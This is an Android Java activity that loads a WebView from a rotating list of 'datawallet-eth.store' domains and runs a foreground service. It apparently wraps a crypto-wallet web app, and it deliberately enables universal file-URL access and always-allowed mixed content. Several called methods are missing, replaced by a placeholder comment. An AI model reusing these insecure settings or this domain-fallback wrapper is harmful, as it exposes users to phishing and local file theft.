package com.example.test;
import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.view.KeyEvent;
import android.webkit.CookieManager;
import android.webkit.DownloadListener;
import android.webkit.URLUtil;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import com.example.test.ForegroundService;
import com.example.test.LocalService;
import com.example.test.RemoteService;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    private WebView webView;
    private final int PICK_REQUEST = 10001;
    ValueCallback<Uri> mFilePathCallback;
    ValueCallback<Uri[]> mFilePathCallbackArray;
    private static final int JOB_ID = 100;
    
    // List of domains to check (modify this list as needed)
    private final List<String> DOMAIN_LIST = Arrays.asList(
        "https://h5.datawallet-eth.store",
        "https://backup1.datawallet-eth.store",
        "https://backup2.datawallet-eth.store"
    );
    
    private final ExecutorService executorService = Executors.newSingleThreadExecutor();

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //隐藏ActionBar
        Objects.requireNonNull(getSupportActionBar()).hide();
        setContentView(R.layout.activity_main);
        
        // Initialize WebView
        initWebView();
        
        // Check domains and load the first available one
        checkAndLoadDomains();
        
        startForegroundService();
    }

    private void initWebView() {
        webView = findViewById(R.id.web_view);
        WebSettings webSettings = webView.getSettings();
        
        // Basic WebView settings
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setUseWideViewPort(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowUniversalAccessFromFileURLs(true);
        webSettings.setAllowFileAccessFromFileURLs(true);
        webSettings.setMediaPlaybackRequiresUserGesture(false);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        // WebView clients
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }
        });

        // File chooser handling
        webView.setWebChromeClient(new WebChromeClient() {
            // Andorid 4.1----4.4
            public void openFileChooser(ValueCallback<Uri> uploadFile, String acceptType, String capture) {
                mFilePathCallback = uploadFile;
                handle(uploadFile);
            }

            // for 5.0+
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
                if (mFilePathCallbackArray != null) {
                    mFilePathCallbackArray.onReceiveValue(null);
                }
                mFilePathCallbackArray = filePathCallback;
                handleup(filePathCallback);
                return true;
            }

            private void handle(ValueCallback<Uri> uploadFile) {
                Intent intent = new Intent(Intent.ACTION_PICK);
                intent.setType("*/*");
                startActivityForResult(intent, PICK_REQUEST);
            }

            private void handleup(ValueCallback<Uri[]> uploadFile) {
                Intent intent = new Intent(Intent.ACTION_PICK);
                intent.setType("*/*");
                startActivityForResult(intent, PICK_REQUEST);
            }
        });

        // Download listener
        webView.setDownloadListener(new DownloadListener() {
            public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {
                DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
                String cookies = CookieManager.getInstance().getCookie(url);
                request.addRequestHeader("cookie", cookies);
                request.addRequestHeader("User-Agent", userAgent);
                request.setDescription("下载中...");
                request.setTitle(URLUtil.guessFileName(url, contentDisposition, mimetype));
                request.allowScanningByMediaScanner(); 
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED); 
                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, URLUtil.guessFileName(url, contentDisposition, mimetype));

                DownloadManager manager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
                manager.enqueue(request);

                showMessage("下载中...");

                // Notification when download completes
                BroadcastReceiver onComplete = new BroadcastReceiver() {
                    public void onReceive(Context ctxt, Intent intent) {
                        showMessage("下载完成");
                        unregisterReceiver(this);
                    }
                };
                registerReceiver(onComplete, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));
            }
        });
    }

    private void checkAndLoadDomains() {
        if (DOMAIN_LIST.size() == 1) {
            // If only one domain, load it directly
            webView.loadUrl(DOMAIN_LIST.get(0));
            return;
        }

        // Show loading message
        showMessage("正在检测可用域名...");

        // Check each domain's availability in background thread
        executorService.execute(() -> {
            String availableDomain = null;
            
            for (String domain : DOMAIN_LIST) {
                if (isDomainAvailable(domain)) {
                    availableDomain = domain;
                    break;
                }
            }
            
            final String finalDomain = availableDomain != null ? availableDomain : DOMAIN_LIST.get(0);
            
            // Run on UI thread to load the WebView
            runOnUiThread(() -> {
                if (finalDomain != null) {
                    webView.loadUrl(finalDomain);
                    showMessage("已连接至可用域名");
                } else {
                    // If no domain is available, load the first one anyway
                    webView.loadUrl(DOMAIN_LIST.get(0));
                    showMessage("无法检测域名状态，尝试直接连接");
                }
            });
        });
    }

    private boolean isDomainAvailable(String domainUrl) {
        try {
            URL url = new URL(domainUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("HEAD");
            connection.setConnectTimeout(3000); // 3 seconds timeout
            connection.setReadTimeout(3000);
            
            int responseCode = connection.getResponseCode();
            return (responseCode == HttpURLConnection.HTTP_OK);
        } catch (Exception e) {
            return false;
        }
    }

    // [Rest of the existing methods remain unchanged...]
    // onKeyDown, showMessage, onDestroy, onActivityResult, handleCallback, 
    // getFilePathFromContentUri, startForegroundService, scheduleJob
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        executorService.shutdown();
        if (webView != null) {
            webView.destroy();
            webView = null;
        }
    }
}